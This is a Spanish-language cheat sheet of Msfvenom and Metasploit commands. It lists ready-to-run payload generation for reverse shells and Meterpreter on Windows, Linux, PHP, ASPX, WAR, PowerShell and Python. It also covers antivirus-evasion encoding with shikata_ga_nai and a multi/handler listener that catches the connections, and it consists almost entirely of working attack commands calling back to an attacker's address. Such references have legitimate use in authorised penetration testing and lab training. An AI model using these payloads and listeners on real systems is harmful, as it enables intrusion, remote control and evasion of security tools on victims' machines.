# Msfvenom & Metasploit Cheat Sheet

Comandos rápidos para la generación de payloads con Msfvenom y configuración de escuchas (multi/handler) en Metasploit.

---

## 1. Sintaxis Básica

```bash
msfvenom -p <PAYLOAD> LHOST=<TU_IP> LPORT=<TU_PUERTO> -f <FORMATO> -o <SALIDA>
```
* **Comandos de consulta**:
  * Listar todos los payloads disponibles: `msfvenom -l payloads`
  * Listar formatos de salida disponibles: `msfvenom -l formats`
  * Listar codificadores (encoders): `msfvenom -l encoders`

---

## 2. Payloads Comunes por Plataforma

### Windows
* Ejecutable reverso TCP (PE - x64):
  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f exe -o shell.exe
  ```
* Biblioteca dinámica reversa (DLL - x64):
  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f dll -o shell.dll
  ```
* Payload para Meterpreter (x64):
  ```bash
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -f exe -o meterpreter.exe
  ```

### Linux
* Ejecutable reverso TCP (ELF - x64):
  ```bash
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f elf -o shell.elf
  ```
* Payload para Meterpreter (x64):
  ```bash
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -f elf -o meter_shell.elf
  ```

### Aplicaciones Web
* Script PHP reverso:
  ```bash
  msfvenom -p php/reverse_php LHOST=<TU_IP> LPORT=4444 -f raw -o shell.php
  ```
* Script ASPX reverso (servidores IIS / ASP.NET):
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f aspx -o shell.aspx
  ```
* Archivo WAR reverso (servidores Java / Tomcat):
  ```bash
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f war -o shell.war
  ```

### Lenguajes y One-Liners
* PowerShell:
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f ps1 -o shell.ps1
  ```
* Python:
  ```bash
  msfvenom -p cmd/unix/reverse_python LHOST=<TU_IP> LPORT=4444 -f raw -o shell.py
  ```

---

## 3. Evasión y Codificación

* Codificación del payload (ej. Shikata Ga Nai - 5 iteraciones):
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
  ```
* Exclusión de caracteres nulos (Bad Characters - codificación en Python):
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -b '\x00\x0a\x0d' -f python
  ```

---

## 4. Controladores en Metasploit (`multi/handler`)

Configuración de receptor para payloads generados.

1. Iniciar Metasploit en consola silenciosa:
   ```bash
   msfconsole -q
   ```
2. Cargar el módulo multi/handler:
   ```text
   msf6 » use exploit/multi/handler
   ```
3. Definir el tipo de payload (debe coincidir con el payload usado en msfvenom):
   ```text
   msf6 exploit(multi/handler) » set payload windows/x64/meterpreter/reverse_tcp
   ```
4. Configurar parámetros de red:
   ```text
   msf6 exploit(multi/handler) » set LHOST <TU_IP>
   msf6 exploit(multi/handler) » set LPORT 4444
   ```
5. Iniciar controlador en segundo plano:
   ```text
   msf6 exploit(multi/handler) » run -j
   ```
